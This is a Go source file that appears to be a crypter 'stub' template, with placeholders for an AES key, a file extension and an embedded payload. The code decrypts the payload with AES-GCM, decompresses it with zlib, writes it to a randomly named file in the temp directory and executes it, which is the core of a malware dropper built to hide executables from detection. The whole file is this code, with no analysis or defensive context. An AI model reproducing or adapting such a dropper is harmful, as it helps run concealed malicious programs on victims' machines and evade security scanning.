package main

import (
	"os"
	"path"
	"path/filepath"
	"compress/zlib"
	"bytes"
	"github.com/pabloskubert/Stub/pkg/aes"
	"time"
	"io"

	uuid "github.com/hashicorp/go-uuid"
)

const (
	AES_KEY = "<KEY>"
	EXT     = "<EXT>"
	GCM_NONCE_SIZE = 12
)

var PAYLOAD = []byte{/*PAYLOAD*/}

func main() {
	otpName, _ := uuid.GenerateUUID()
	fullOtp := filepath.Join(os.TempDir(), otpName + EXT)

	nonce := PAYLOAD[:GCM_NONCE_SIZE]
	aes := &aes.AesCrypto{
		Chave: AES_KEY,
	}
	err := aes.NewAesCrypto(nonce)
	if err != nil {
		panic(err)
	}

	rawPayload, err := aes.Decriptar(PAYLOAD[GCM_NONCE_SIZE:])
	if err != nil {
		panic(err)
	}

	b := bytes.NewReader(rawPayload) 
	r, _ := zlib.NewReader(b)

	if _, err := os.Stat(fullOtp); os.IsNotExist(err) {
		os.MkdirAll(path.Dir(fullOtp), 0755)
		os.Create(fullOtp)
	}

	f, err := os.OpenFile(fullOtp, os.O_WRONLY, 0644)
	if err != nil {
		return;
	}

	_, err = io.Copy(f, r)
	if err != nil {
		return;
	}	

	r.Close()
	f.Close()
	proc, err := os.StartProcess(fullOtp, []string{fullOtp}, &os.ProcAttr{
		Dir:   path.Dir(fullOtp),
		Env: os.Environ(),
		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
	})
	
	if err != nil {
		return
	}

	for err := proc.Release(); err != nil; {
		time.Sleep(time.Second * 2)
	}

}
